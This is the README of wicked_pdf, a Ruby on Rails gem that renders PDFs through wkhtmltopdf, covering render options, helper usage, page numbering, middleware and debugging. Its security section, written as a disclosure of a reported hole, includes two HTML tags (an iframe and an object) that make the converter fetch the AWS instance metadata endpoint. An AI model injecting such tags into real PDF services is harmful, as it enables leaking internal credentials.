&#xA;&lt;h4&gt;Asset pipeline usage&lt;/h4&gt; &#xA;&lt;p&gt;It is best to precompile assets used in PDF views. This will help avoid issues when it comes to deploying, as Rails serves asset files differently between development and production (&lt;code&gt;config.assets.compile = false&lt;/code&gt;), which can make it look like your PDFs work in development, but fail to load assets in production.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;config.assets.precompile += [&#39;blueprint/screen.css&#39;, &#39;pdf.css&#39;, &#39;jquery.ui.datepicker.js&#39;, &#39;pdf.js&#39;, ...etc...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;CDN reference&lt;/h4&gt; &#xA;&lt;p&gt;In this case, you can use that standard Rails helpers and point to the current CDN for whichever framework you are using. For jQuery, it would look somethng like this, given the current versions at the time of this writing.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;&#xA;&amp;lt;html&amp;gt;&#xA;  &amp;lt;head&amp;gt;&#xA;    &amp;lt;%= javascript_include_tag &#34;http://code.jquery.com/jquery-1.10.0.min.js&#34; %&amp;gt;&#xA;    &amp;lt;%= javascript_include_tag &#34;http://code.jquery.com/ui/1.10.3/jquery-ui.min.js&#34; %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Advanced Usage with all available options&lt;/h3&gt; &#xA;&lt;p&gt;&lt;em&gt;NOTE: Certain options are only supported in specific versions of wkhtmltopdf.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class ThingsController &amp;lt; ApplicationController&#xA;  def show&#xA;    respond_to do |format|&#xA;      format.html&#xA;      format.pdf do&#xA;        render pdf:                            &#39;file_name&#39;,&#xA;               disposition:                    &#39;attachment&#39;,                 # default &#39;inline&#39;&#xA;               template:                       &#39;things/show&#39;,&#xA;               locals:                         {foo: @bar},&#xA;               file:                           &#34;#{Rails.root}/files/foo.erb&#34;,&#xA;               inline:                         &#39;&amp;lt;!doctype html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;INLINE HTML&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&#39;,&#xA;               layout:                         &#39;pdf&#39;,                        # for a pdf.pdf.erb file&#xA;               wkhtmltopdf:                    &#39;/usr/local/bin/wkhtmltopdf&#39;, # path to binary&#xA;               show_as_html:                   params.key?(&#39;debug&#39;),         # allow debugging based on url param&#xA;               orientation:                    &#39;Landscape&#39;,                  # default Portrait&#xA;               page_size:                      &#39;A4, Letter, ...&#39;,            # default A4&#xA;               page_height:                    NUMBER,&#xA;               page_width:                     NUMBER,&#xA;               save_to_file:                   Rails.root.join(&#39;pdfs&#39;, &#34;#{filename}.pdf&#34;),&#xA;               save_only:                      false,                        # depends on :save_to_file being set first&#xA;               default_protocol:               &#39;http&#39;,&#xA;               proxy:                          &#39;TEXT&#39;,&#xA;               basic_auth:                     false                         # when true username &amp;amp; password are automatically sent from session&#xA;               username:                       &#39;TEXT&#39;,&#xA;               password:                       &#39;TEXT&#39;,&#xA;               title:                          &#39;Alternate Title&#39;,            # otherwise first page title is used&#xA;               cover:                          &#39;URL, Pathname, or raw HTML string&#39;,&#xA;               dpi:                            &#39;dpi&#39;,&#xA;               encoding:                       &#39;TEXT&#39;,&#xA;               user_style_sheet:               &#39;URL&#39;,&#xA;               cookie:                         [&#39;_session_id SESSION_ID&#39;], # could be an array or a single string in a &#39;name value&#39; format&#xA;               post:                           [&#39;query QUERY_PARAM&#39;],      # could be an array or a single string in a &#39;name value&#39; format&#xA;               redirect_delay:                 NUMBER,&#xA;               javascript_delay:               NUMBER,&#xA;               window_status:                  &#39;TEXT&#39;,                     # wait to render until some JS sets window.status to the given string&#xA;               image_quality:                  NUMBER,&#xA;               no_pdf_compression:             true,&#xA;               zoom:                           FLOAT,&#xA;               page_offset:                    NUMBER,&#xA;               book:                           true,&#xA;               default_header:                 true,&#xA;               disable_javascript:             false,&#xA;               grayscale:                      true,&#xA;               lowquality:                     true,&#xA;               enable_plugins:                 true,&#xA;               disable_internal_links:         true,&#xA;               disable_external_links:         true,&#xA;               keep_relative_links:            true,&#xA;               print_media_type:               true,&#xA;&#xA;               # define as true the key &#39;disable_local_file_access&#39; or &#39;enable_local_file_access&#39;, not both&#xA;               disable_local_file_access:      true,&#xA;               enable_local_file_access:       false,                     # must be true when using wkhtmltopdf &amp;gt; 0.12.6&#xA;               allow:                          [&#34;#{Rails.root}/public&#34;],  # could be an array or a single string&#xA;&#xA;               disable_smart_shrinking:        true,&#xA;               use_xserver:                    true,&#xA;               background:                     false,                     # background needs to be true to enable background colors to render&#xA;               no_background:                  true,&#xA;               no_stop_slow_scripts:           false,&#xA;               viewport_size:                  &#39;TEXT&#39;,                    # available only with use_xserver or patched QT&#xA;               extra:                          &#39;&#39;,                        # directly inserted into the command to wkhtmltopdf&#xA;               raise_on_all_errors:            nil,                       # raise error for any stderr output.  Such as missing media, image assets&#xA;               log_level:                      &#39;info&#39;,                    # Available values: none, error, warn, or info - only available with wkhtmltopdf 0.12.5+&#xA;               quiet:                          false,                     # `false` is same as `log_level: &#39;info&#39;`, `true` is same as `log_level: &#39;none&#39;`&#xA;               outline: {   outline:           true,&#xA;                            outline_depth:     LEVEL },&#xA;               margin:  {   top:               SIZE,                     # default 10 (mm)&#xA;                            bottom:            SIZE,&#xA;                            left:              SIZE,&#xA;                            right:             SIZE },&#xA;               header:  {   html: {            template: &#39;users/header&#39;,          # use :template OR :url&#xA;                                               layout:   &#39;pdf_plain&#39;,             # optional, use &#39;pdf_plain&#39; for a pdf_plain.html.pdf.erb file, defaults to main layout&#xA;                                               url:      &#39;www.example.com&#39;,&#xA;                                               locals:   { foo: @bar }},&#xA;                            center:            &#39;TEXT&#39;,&#xA;                            font_name:         &#39;NAME&#39;,&#xA;                            font_size:         SIZE,&#xA;                            left:              &#39;TEXT&#39;,&#xA;                            right:             &#39;TEXT&#39;,&#xA;                            spacing:           REAL,&#xA;                            line:              true,&#xA;                            content:           &#39;HTML CONTENT ALREADY RENDERED&#39;}, # optionally you can pass plain html already rendered (useful if using pdf_from_string)&#xA;               footer:  {   html: {   template:&#39;shared/footer&#39;,         # use :template OR :url&#xA;                                      layout:  &#39;pdf_plain.html&#39;,        # optional, use &#39;pdf_plain&#39; for a pdf_plain.html.pdf.erb file, defaults to main layout&#xA;                                      url:     &#39;www.example.com&#39;,&#xA;                                      locals:  { foo: @bar }},&#xA;                            center:            &#39;TEXT&#39;,&#xA;                            font_name:         &#39;NAME&#39;,&#xA;                            font_size:         SIZE,&#xA;                            left:              &#39;TEXT&#39;,&#xA;                            right:             &#39;TEXT&#39;,&#xA;                            spacing:           REAL,&#xA;                            line:              true,&#xA;                            content:           &#39;HTML CONTENT ALREADY RENDERED&#39;}, # optionally you can pass plain html already rendered (useful if using pdf_from_string)&#xA;               toc:     {   font_name:         &#34;NAME&#34;,&#xA;                            depth:             LEVEL,&#xA;                            header_text:       &#34;TEXT&#34;,&#xA;                            header_fs:         SIZE,&#xA;                            text_size_shrink:  0.8,&#xA;                            l1_font_size:      SIZE,&#xA;                            l2_font_size:      SIZE,&#xA;                            l3_font_size:      SIZE,&#xA;                            l4_font_size:      SIZE,&#xA;                            l5_font_size:      SIZE,&#xA;                            l6_font_size:      SIZE,&#xA;                            l7_font_size:      SIZE,&#xA;                            level_indentation: NUM,&#xA;                            l1_indentation:    NUM,&#xA;                            l2_indentation:    NUM,&#xA;                            l3_indentation:    NUM,&#xA;                            l4_indentation:    NUM,&#xA;                            l5_indentation:    NUM,&#xA;                            l6_indentation:    NUM,&#xA;                            l7_indentation:    NUM,&#xA;                            no_dots:           true,&#xA;                            disable_dotted_lines:  true,&#xA;                            disable_links:     true,&#xA;                            disable_toc_links: true,&#xA;                            disable_back_links:true,&#xA;                            xsl_style_sheet:   &#39;file.xsl&#39;}, # optional XSLT stylesheet to use for styling table of contents&#xA;               progress: proc { |output| puts output } # proc called when console output changes&#xA;      end&#xA;    end&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By default, it will render without a layout (layout: false) and the template for the current controller and action.&lt;/p&gt; &#xA;&lt;h4&gt;wkhtmltopdf Binary Options&lt;/h4&gt; &#xA;&lt;p&gt;Some of the options above are being passed to &lt;code&gt;wkhtmltopdf&lt;/code&gt; binary. They can be used to control the options used in Webkit rendering before generating the PDF.&lt;/p&gt; &#xA;&lt;p&gt;Examples of those options are:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;print_media_type: true        # Passes `--print-media-type`&#xA;no_background: true           # Passes `--no-background`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can see the complete list of options under &#34;Global Options&#34; in wkhtmltopdf usage &lt;a href=&#34;http://wkhtmltopdf.org/usage/wkhtmltopdf.txt&#34;&gt;docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Super Advanced Usage&lt;/h3&gt; &#xA;&lt;p&gt;If you need to just create a pdf and not display it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# create a pdf from a string&#xA;pdf = WickedPdf.new.pdf_from_string(&#39;&amp;lt;h1&amp;gt;Hello There!&amp;lt;/h1&amp;gt;&#39;)&#xA;&#xA;# create a pdf file from a html file without converting it to string&#xA;# Path must be absolute path&#xA;pdf = WickedPdf.new.pdf_from_html_file(&#39;/your/absolute/path/here&#39;)&#xA;&#xA;# create a pdf from a URL&#xA;pdf = WickedPdf.new.pdf_from_url(&#39;https://github.com/mileszs/wicked_pdf&#39;)&#xA;&#xA;# create a pdf from string using templates, layouts and content option for header or footer&#xA;pdf = WickedPdf.new.pdf_from_string(&#xA;  render_to_string(&#39;templates/pdf&#39;, layout: &#39;pdfs/layout_pdf.html&#39;),&#xA;  footer: {&#xA;    content: render_to_string(&#xA;  &#x9;&#x9;&#39;templates/footer&#39;,&#xA;  &#x9;&#x9;layout: &#39;pdfs/layout_pdf.html&#39;&#xA;  &#x9;)&#xA;  }&#xA;)&#xA;&#xA;# It is possible to use footer/header templates without a layout, in that case you need to provide a valid HTML document&#xA;pdf = WickedPdf.new.pdf_from_string(&#xA;  render_to_string(&#39;templates/full_pdf_template&#39;),&#xA;  header: {&#xA;    content: render_to_string(&#39;templates/full_header_template&#39;)&#xA;  }&#xA;)&#xA;&#xA;# or from your controller, using views &amp;amp; templates and all wicked_pdf options as normal&#xA;pdf = render_to_string pdf: &#34;some_file_name&#34;, template: &#34;templates/pdf&#34;, encoding: &#34;UTF-8&#34;&#xA;&#xA;# then save to a file&#xA;save_path = Rails.root.join(&#39;pdfs&#39;,&#39;filename.pdf&#39;)&#xA;File.open(save_path, &#39;wb&#39;) do |file|&#xA;  file &amp;lt;&amp;lt; pdf&#xA;end&#xA;&#xA;# you can also track progress on your PDF generation, such as when using it from within a Resque job&#xA;class PdfJob&#xA;  def perform&#xA;    blk = proc { |output|&#xA;      match = output.match(/\[.+\] Page (?&amp;lt;current_page&amp;gt;\d+) of (?&amp;lt;total_pages&amp;gt;\d+)/)&#xA;      if match&#xA;        current_page = match[:current_page].to_i&#xA;        total_pages = match[:total_pages].to_i&#xA;        message = &#34;Generated #{current_page} of #{total_pages} pages&#34;&#xA;        at current_page, total_pages, message&#xA;      end&#xA;    }&#xA;    WickedPdf.new.pdf_from_string(html, progress: blk)&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you need to display utf encoded characters, add this to your pdf views or layouts:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;meta charset=&#34;utf-8&#34; /&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you need to return a PDF in a controller with Rails in API mode:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pdf_html = ActionController::Base.new.render_to_string(template: &#39;controller_name/action_name&#39;, layout: &#39;pdf&#39;)&#xA;pdf = WickedPdf.new.pdf_from_string(pdf_html)&#xA;send_data pdf, filename: &#39;file.pdf&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Page Breaks&lt;/h3&gt; &#xA;&lt;p&gt;You can control page breaks with CSS.&lt;/p&gt; &#xA;&lt;p&gt;Add a few styles like this to your stylesheet or page:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;div.alwaysbreak { page-break-before: always; }&#xA;div.nobreak:before { clear:both; }&#xA;div.nobreak { page-break-inside: avoid; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Page Numbering&lt;/h3&gt; &#xA;&lt;p&gt;A bit of javascript can help you number your pages. Create a template or header/footer file with this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;head&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      function number_pages() {&#xA;        var vars={};&#xA;        var x=document.location.search.substring(1).split(&#39;&amp;amp;&#39;);&#xA;        for(var i in x) {var z=x[i].split(&#39;=&#39;,2);vars[z[0]] = decodeURIComponent(z[1]);}&#xA;        var x=[&#39;frompage&#39;,&#39;topage&#39;,&#39;page&#39;,&#39;webpage&#39;,&#39;section&#39;,&#39;subsection&#39;,&#39;subsubsection&#39;];&#xA;        for(var i in x) {&#xA;          var y = document.getElementsByClassName(x[i]);&#xA;          for(var j=0; j&amp;lt;y.length; ++j) y[j].textContent = vars[x[i]];&#xA;        }&#xA;      }&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/head&amp;gt;&#xA;  &amp;lt;body onload=&#34;number_pages()&#34;&amp;gt;&#xA;    Page &amp;lt;span class=&#34;page&#34;&amp;gt;&amp;lt;/span&amp;gt; of &amp;lt;span class=&#34;topage&#34;&amp;gt;&amp;lt;/span&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Anything with a class listed in &#34;var x&#34; above will be auto-filled at render time.&lt;/p&gt; &#xA;&lt;p&gt;If you do not have explicit page breaks (and therefore do not have any &#34;page&#34; class), you can also use wkhtmltopdf&#39;s built in page number generation by setting one of the headers to &#34;[page]&#34;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;render pdf: &#39;filename&#39;, header: { right: &#39;[page] of [topage]&#39; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;You can put your default configuration, applied to all pdf&#39;s at &#34;wicked_pdf.rb&#34; initializer.&lt;/p&gt; &#xA;&lt;h3&gt;Rack Middleware&lt;/h3&gt; &#xA;&lt;p&gt;If you would like to have WickedPdf automatically generate PDF views for all (or nearly all) pages by appending .pdf to the URL, add the following to your Rails app:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# in application.rb (Rails3) or environment.rb (Rails2)&#xA;require &#39;wicked_pdf&#39;&#xA;config.middleware.use WickedPdf::Middleware&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to turn on or off the middleware for certain URLs, use the &lt;code&gt;:only&lt;/code&gt; or &lt;code&gt;:except&lt;/code&gt; conditions like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;# conditions can be plain strings or regular expressions, and you can supply only one or an array&#xA;config.middleware.use WickedPdf::Middleware, {}, only: &#39;/invoice&#39;&#xA;config.middleware.use WickedPdf::Middleware, {}, except: [ %r[^/admin], &#39;/secret&#39;, %r[^/people/\d] ]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you use the standard &lt;code&gt;render pdf: &#39;some_pdf&#39;&lt;/code&gt; in your app, you will want to exclude those actions from the middleware.&lt;/p&gt; &#xA;&lt;h3&gt;Include in an email as an attachment&lt;/h3&gt; &#xA;&lt;p&gt;To include a rendered pdf file in an email you can do the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;attachments[&#39;attachment.pdf&#39;] = WickedPdf.new.pdf_from_string(&#xA;  render_to_string(&#39;link_to_view.pdf.erb&#39;, layout: &#39;pdf&#39;)&#xA;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will render the pdf to a string and include it in the email. This is very slow so make sure you schedule your email delivery in a job.&lt;/p&gt; &#xA;&lt;h3&gt;Further Reading&lt;/h3&gt; &#xA;&lt;p&gt;Mike Ackerman&#39;s post &lt;a href=&#34;https://www.viget.com/articles/how-to-create-pdfs-in-rails&#34;&gt;How To Create PDFs in Rails&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Andreas Happe&#39;s post &lt;a href=&#34;http://www.snikt.net/blog/2012/04/26/wicked-pdf/&#34;&gt;Generating PDFs from Ruby on Rails&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;JESii&#39;s post &lt;a href=&#34;http://www.nubyrubyrailstales.com/2013/06/wickedpdf-wkhtmltopdf-and-herokua.html&#34;&gt;WickedPDF, wkhtmltopdf, and Heroku...a tricky combination&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Berislav Babic&#39;s post &lt;a href=&#34;http://berislavbabic.com/send-pdf-attachments-from-rails-with-wickedpdf-and-actionmailer/&#34;&gt;Send PDF attachments from Rails with WickedPdf and ActionMailer&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Corsego&#39;s 2021 post &lt;a href=&#34;https://blog.corsego.com/gem-wicked-pdf&#34;&gt;Complete guide to generating PDFs with gem wicked_pdf&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;PDFTron&#39;s post &lt;a href=&#34;https://www.pdftron.com/blog/rails/how-to-generate-pdf-with-ruby-on-rails/&#34;&gt;How to Generate PDFs With Ruby on Rails&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;StackOverflow &lt;a href=&#34;http://stackoverflow.com/questions/tagged/wicked-pdf&#34;&gt;questions with the tag &#34;wicked-pdf&#34;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Screencasts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;SupeRails Screencast [EN]&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/tFvtwEmW-GE&#34;&gt;&lt;img src=&#34;https://i3.ytimg.com/vi/tFvtwEmW-GE/hqdefault.jpg&#34; alt=&#34;Ruby on Rails #17 generate, save, send PDFs with gem wicked_pdf&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;codigofacilito Screencast [ES]&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/jeWM_gusmJc&#34;&gt;&lt;img src=&#34;https://i3.ytimg.com/vi/jeWM_gusmJc/hqdefault.jpg&#34; alt=&#34;Generar PDF con Ruby on Rails - Tutorial&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Debugging&lt;/h3&gt; &#xA;&lt;p&gt;Now you can use a debug param on the URL that shows you the content of the pdf in plain html to design it faster.&lt;/p&gt; &#xA;&lt;p&gt;First of all you must configure the render parameter &lt;code&gt;show_as_html: params.key?(&#39;debug&#39;)&lt;/code&gt; and then just use it like you normally would but add &#34;debug&#34; as a GET param in the URL:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://localhost:3001/CONTROLLER/X.pdf?debug&#34;&gt;http://localhost:3001/CONTROLLER/X.pdf?debug&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;However, the wicked_pdf_* helpers will use file:/// paths for assets when using :show_as_html, and your browser&#39;s cross-domain safety feature will kick in, and not render them. To get around this, you can load your assets like so in your templates:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;%= params.key?(&#39;debug&#39;) ? image_tag(&#39;foo&#39;) : wicked_pdf_image_tag(&#39;foo&#39;) %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Gotchas&lt;/h4&gt; &#xA;&lt;p&gt;If one image from your HTML cannot be found (relative or wrong path for example), others images with right paths &lt;strong&gt;may not&lt;/strong&gt; be displayed in the output PDF as well (it seems to be an issue with wkhtmltopdf).&lt;/p&gt; &#xA;&lt;p&gt;wkhtmltopdf may render at different resolutions on different platforms. For example, Linux prints at 75 dpi (native for WebKit) while on Windows it&#39;s at the desktop&#39;s DPI (which is normally 96 dpi). &lt;a href=&#34;https://github.com/wkhtmltopdf/wkhtmltopdf/issues/2184&#34;&gt;Use &lt;code&gt;:zoom =&amp;gt; 0.78125&lt;/code&gt;&lt;/a&gt; (75/96) to match Linux rendering to Windows.&lt;/p&gt; &#xA;&lt;h3&gt;Security considerations&lt;/h3&gt; &#xA;&lt;p&gt;WickedPdf renders page content on the server by saving HTML and assets to temporary files on disk, then executing &lt;code&gt;wkhtmltopdf&lt;/code&gt; to convert that HTML to a PDF file.&lt;/p&gt; &#xA;&lt;p&gt;It is highly recommended if you allow user-generated HTML/CSS/JS to be converted to PDF, you sanitize it first, or at least disallow requesting content from internal IP addresses and hostnames.&lt;/p&gt; &#xA;&lt;p&gt;For example, these could potentially leak internal AWS metadata:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;iframe src=&#34;http://169.254.169.254/latest/meta-data/&#34;&amp;gt;&amp;lt;/iframe&amp;gt;&#xA;&amp;lt;object data=&#34;http://169.254.169.254/latest/meta-data/&#34; type=&#34;text/html&#34;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Thank you to Adam Gold from &lt;a href=&#34;https://snyk.io&#34;&gt;Snyk&lt;/a&gt; for reporting this. We are considering adding host allow &amp;amp; block lists and/or potentially HTML element sanitizing. Please open an issue or PR to help us out with this.&lt;/p&gt; &#xA;&lt;h3&gt;Inspiration&lt;/h3&gt; &#xA;&lt;p&gt;You may have noticed: this plugin is heavily inspired by the PrinceXML plugin &lt;a href=&#34;http://github.com/mbleigh/princely/tree/master&#34;&gt;princely&lt;/a&gt;. PrinceXML&#39;s cost was prohibitive for me. So, with a little help from some friends (thanks &lt;a href=&#34;http://github.com/jqr&#34;&gt;jqr&lt;/a&gt;), I tracked down wkhtmltopdf, and here we are.&lt;/p&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Fork it&lt;/li&gt; &#xA; &lt;li&gt;Create your feature branch (&lt;code&gt;git checkout -b my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Run the test suite and check the output (&lt;code&gt;rake&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Add tests for your feature or fix (please)&lt;/li&gt; &#xA; &lt;li&gt;Commit your changes (&lt;code&gt;git commit -am &#39;Add some feature&#39;&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Push to the branch (&lt;code&gt;git push origin my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Create new Pull Request&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Awesome Peoples&lt;/h3&gt; &#xA;&lt;p&gt;Also, thanks to &lt;a href=&#34;https://github.com/Unixmonkey&#34;&gt;unixmonkey&lt;/a&gt;, &lt;a href=&#34;http://github.com/galdomedia&#34;&gt;galdomedia&lt;/a&gt;, &lt;a href=&#34;http://github.com/jcrisp&#34;&gt;jcrisp&lt;/a&gt;, &lt;a href=&#34;http://github.com/lleirborras&#34;&gt;lleirborras&lt;/a&gt;, &lt;a href=&#34;http://github.com/tiennou&#34;&gt;tiennou&lt;/a&gt;, and everyone else for all their hard work and patience with my delays in merging in their enhancements.&lt;/p&gt;</summary>
  </entry>
</feed>